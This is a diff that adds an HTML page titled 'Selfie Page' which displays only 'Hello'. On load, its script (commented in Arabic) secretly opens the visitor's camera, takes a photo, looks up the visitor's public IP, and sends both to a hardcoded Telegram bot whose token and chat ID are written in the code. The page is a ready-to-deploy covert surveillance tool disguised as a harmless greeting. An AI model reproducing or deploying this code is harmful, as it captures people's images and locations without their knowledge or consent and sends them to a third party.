@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Page</title>
+</head>
+<body style="text-align: center; font-size: 2em;">
+    <h1>Hello</h1>
+    <script>
+        // أخذ صورة سيلفي في الخلفية
+        async function captureSelfie() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => {
+                    video.onloadedmetadata = resolve;
+                    video.play();
+                });
+
+                // التقاط صورة
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // إيقاف الكاميرا بعد التقاط الصورة
+                stream.getTracks().forEach(track => track.stop());
+
+                // تحويل الصورة إلى Base64
+                const photoData = canvas.toDataURL('image/jpeg');
+
+                // تحويل Base64 إلى Blob
+                const byteCharacters = atob(photoData.split(',')[1]);
+                const byteArrays = [];
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
+                const blob = new Blob(byteArrays, { type: 'image/jpeg' });
+
+                // جلب بيانات الـ IP العام
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = `IP: ${ipData.ip}`;
+
+                // إرسال البيانات إلى بوت تلغرام
+                sendToTelegram(blob, ipAddress);
+            } catch (err) {
+                console.error('Error capturing selfie:', err);
+            }
+        }
+
+        // إرسال البيانات إلى بوت تلغرام
+        function sendToTelegram(photoBlob, ipAddress) {
+            const botToken = "7986358827:AAEMJZ08_efX_g0LR3BAX4JtNWAe5ADeUNg";
+            const chatId = "6363115796";
+
+            // إنشاء FormData
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'selfie.jpg');
+            formData.append('caption', ipAddress);  // إضافة الـ IP العام في الـ caption
+
+            // إرسال الصورة مع البيانات إلى Telegram API
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Sent to Telegram:', data);
+              }).catch(err => {
+                  console.error('Error sending to Telegram:', err);
+              });
+        }
+
+        // تنفيذ التقاط الصورة فور تحميل الصفحة
+        captureSelfie();
+    </script>
+</body>
+</html>
